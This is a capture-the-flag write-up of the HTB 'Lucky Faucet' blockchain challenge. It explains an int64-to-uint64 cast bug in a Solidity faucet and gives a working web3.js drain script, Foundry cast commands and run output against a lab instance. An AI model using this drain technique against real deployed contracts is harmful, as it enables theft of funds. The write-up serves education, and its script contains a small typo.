# HTB Cyber Apocalypse 2024: Hacker Royale - Lucky Faucet

## Challenge

> The Fray announced the placement of a faucet along the path for adventurers who can overcome the initial challenges. It's designed to provide enough resources for all players, with the hope that someone won't monopolize it, leaving none for others.

## Metadata

- Difficulty: easy
- Creator: `perrythepwner`
- Files: [`Setup.sol`](files/Setup.sol), [`LuckyFaucet.sol`](files/LuckyFaucet.sol)
- Docker: yes
- Tags: `blockchain`, `smart contracts`, `integer conversion`
- Points: `300`
- Number of solvers: 

## Solution

### Initial analysis

We get two smart contract implementations in Solidity: [`Setup.sol`](files/Setup.sol) and [`LuckyFaucet.sol`](files/LuckyFaucet.sol).

Let's start to analyze `Setup.sol` first:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import {LuckyFaucet} from "./LuckyFaucet.sol";

contract Setup {
    LuckyFaucet public immutable TARGET;

    uint256 constant INITIAL_BALANCE = 500 ether;

    constructor() payable {
        TARGET = new LuckyFaucet{value: INITIAL_BALANCE}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance <= INITIAL_BALANCE - 10 ether;
    }
}
```

The contract is pretty simple, it is a typical `Setup.sol` for a smart contract challenge. In the constructor, it initializes a `LuckyFaucet` contract eith `500 ether` and the `isSolved` function check whether the `LuckyFaucet` contract has maximum `490 ether`. Our target is to somehow get minimum `10 ether` from the `LuckyFaucet` contract.

Now let's analyze the `LuckyFaucet.sol` file:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract LuckyFaucet {
    int64 public upperBound;
    int64 public lowerBound;

    constructor() payable {
        // start with 50M-100M wei Range until player changes it
        upperBound = 100_000_000;
        lowerBound =  50_000_000;
    }

    function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :)
        // we don't have infinite money glitch.
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }

    function sendRandomETH() public returns (bool, uint64) {
        int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
        // we can safely cast to uint64 since we'll never 
        // have to worry about sending more than 2**64 - 1 wei 
        uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
        bool sent = msg.sender.send(amountToSend);
        return (sent, amountToSend);
    }
}
```

In the constructor, it initializes the upper and lower bounds to `100.000.000` and `50.000.000` respectively. The `setBounds` function allows the caller to set the `upperBound` and `lowerBound` between some contstrains. The `sendRandomETH` transfers `amountToSend` ether to the caller. The maximum amount it can send it `(upperBound - lowerBound + 1) + lowerBound)` which is 100M Wei. As 1 ether == 10**18 Wei it would require us to call the `sendRandomETH` function at least `10*10**18 / 10**8 = 10*11` times which is not feasible.

### The vulnerability

If we check the types of the `upperBound`, `lowerBound` and `amountToSend` variables, it turns out that the bounds are `int64` and the `amountToSend` is `uint64`. If we can set the bounds to be negative the conversion from `int64` to `uint64` might give us a bigger number than the original bounds would allow. Luckly in the `setBounds` function only the upper bounds are check to we can set `upperBound` and `lowerBound` to be negativ.

### The solution

Let's try to do some calculations. We want the `amountToSend` to be large because of the conversion, then this implies that the `randomInt % (upperBound - lowerBound + 1) + lowerBound` to be a small negative number like `-1`, `-2`.

If we set the `upperBound` to `-1` and the `lowerBound` to `-2` then: `randomInt % (-1 - -2 + 1) + -2 = randomInt % 2 - 2`. `randomInt % 2` is either `0` or `1`, so the whole statement is either `-2`, `-1`. Converting this number to `uint64` is either `18446744073709551614`, `18446744073709551615`. This is almost 20 ether so we are good.

I've created a [`solve.js`](files/solve.js) files which sets the bounds and calls the `sendRandomETH`. Also compiled the contracts to get the ABI JSON files ([`LuckyFaucet_sol_LuckyFaucet.json`](files/LuckyFaucet_sol_LuckyFaucet.json), [`Setup_sol_Setup.json`](files/Setup_sol_Setup.json)):

```bash
$ sudo apt install nodejs
$ sudo apt install npm
$ sudo npm i -g web3
$ sudo npm i -g sol
$ sudo npm i -g solc@0.8.23
$ export NODE_PATH=$(npm root --quiet -g)
$ npx solcjs Setup.sol --bin --abi
```

```javascript
const Web3 = require('web3');

const web3 = new Web3.Web3(new Web3.Web3.providers.HttpProvider('http://83.136.249.153:33087'));

const privateKey = '0xbcbd57858f1e0604060bc2e6e4075589c95cbfdf3c8f05dac5963ff129393f37'
const signer = web3.eth.accounts.privateKeyToAccount(privateKey);
const Setup_deployedAddress = '0x4e1CA36DbC9a3a5C46B32D664111CB87253b6582';
const LuckyFaucet_deployedAddress = '0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49';

const Setup_abi = require('./Setup_sol_Setup.json');
const SetupContract = new web3.eth.Contract(Setup_abi, Setup_deployedAddress);
const LuckyFaucet_abi = require('./LuckyFaucet_sol_LuckyFaucet.json');
const LuckyFaucetContract = new web3.eth.Contract(LuckyFaucet_abi, LuckyFaucet_deployedAddress);

function getBalance(address) {
  web3.eth.getBalance(address)
    .then(balance => {
      const etherBalance = web3.utils.fromWei(balance, 'ether');
      console.log(`Balance of ${address}: ${etherBalance} ETH`);
    })
    .catch(error => console.error('Error getting balance:', error));
}

async function callIsSolved() {
  return SetupContract.methods.isSolved().call();
}

async function getBounds() {
    await LuckyFaucetContract.methods.lowerBound().call().then(
      value => console.log('lowerBound: ', value)
    ).catch(error => console.error('Error calling lowerBound: ', error));

    await LuckyFaucetContract.methods.upperBound().call().then(
        value => console.log('upperBound: ', value)
      ).catch(error => console.error('Error calling upperBound: ', error));
  }

async function callSetBounds(lower, upper) {
  await LuckyFaucetContract.methods.setBounds(lower, upper).send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('setBounds: ', value.events)
  ).catch(error => console.error('Error calling setBounds: ', error));
}

async function callSendRandomETH() {
  await LuckyFaucetContract.methods.sendRandomETH().send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('sendRandomETH: ', value.events)
  ).catch(error => console.error('Error calling sendRandomETH: ', error));
}

async function exploit() {
  var solved = await callIsSolved()
  await getBounds()
  getBalance(signer.address)
  getBalance(LuckyFaucet_deployedAddress);

  var lower = -2;
  var upper = -1;
  console.log(`Solved: `, solved)
  await callSetBounds(lower, upper)
  await getBounds()
  await callSendRandomETH()

  getBalance(signer.address)
  getBalance(LuckyFaucete_deployedAddress);
}

exploit()
```


```
$ node solve.js
lowerBound:  50000000n
upperBound:  100000000n
Solved:  false
Balance of 0x2e0C1FD6033b0D3d6ef69c3F1776c51bcD0d9715: 5000 ETH
Balance of 0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49: 500 ETH
lowerBound:  -2n
upperBound:  -1n

$ node solve.js
lowerBound:  -2n
upperBound:  -1n
Solved:  true
Balance of 0x2e0C1FD6033b0D3d6ef69c3F1776c51bcD0d9715: 5018.446599148709551615 ETH
Balance of 0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49: 481.553255926290448385 ETH
lowerBound:  -2n
upperBound:  -1n
```

Now let's try to get the flag from the other port:

```
$ nc 83.136.249.153 41926
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0xbcbd57858f1e0604060bc2e6e4075589c95cbfdf3c8f05dac5963ff129393f37
Address         :  0x2e0C1FD6033b0D3d6ef69c3F1776c51bcD0d9715
Target contract :  0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49
Setup contract  :  0x4e1CA36DbC9a3a5C46B32D664111CB87253b6582

$ nc 83.136.249.153 41926
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{1_f0rg0r_s0m3_U}
```

Flag: `HTB{1_f0rg0r_s0m3_U}`

Some additional notes:
- I've leant that for these kind of challenges it is much easire to use [`Foundry`](https://book.getfoundry.sh/).
```bash
$ cast send --rpc-url $RPC_URL --private-key $PVK $TARGET "setBounds(int64,int64)" -- -2 -1
$ cast send $TARGET "sendRandomETH()" --rpc-url $RPC_URL --private-key $PVK
```
- Solidity versions before 0.8.0 lack native integer overflow checks, leading to an integer underflow when negative bounds are set.